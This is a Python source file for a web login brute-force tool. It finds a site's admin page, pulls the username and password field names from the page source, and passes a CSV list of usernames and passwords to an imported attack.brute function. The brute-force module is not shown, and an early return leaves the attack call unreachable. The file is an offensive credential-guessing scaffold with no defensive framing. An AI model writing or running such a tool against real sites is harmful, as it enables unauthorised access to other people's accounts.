import attack
import WebInfo
import yaml
import pandas
import webParser

class LoginBrute:
    def __init__(
        self,
    ):
        print("#########################################\n\n")

        with open("config.yml", "r") as ymlfile:
            args = yaml.safe_load(ymlfile)

        # args = [{str(j): str(i) for i, j in enumerate(d)} for d in cfg]

        args["url"] = WebInfo.get_admin_page(args["url"])
        
        args["user_param"], args["password_param"] =  webParser.get_source(args["url"],args["req_body"], 'javascript')
        print('params: '+ args["user_param"], args["password_param"])
        return
        try:
            pass_user = pandas.read_csv(args["pass_user"])

        except IOError as e:
            print("File " + args["pass_user"] + " not found")

        args["user_list"] = pass_user["Usernames"]
        args["passwords"] = pass_user["Passwords"]
        print(str(type(args["req_body"])))
        attack.brute(args)


LoginBrute()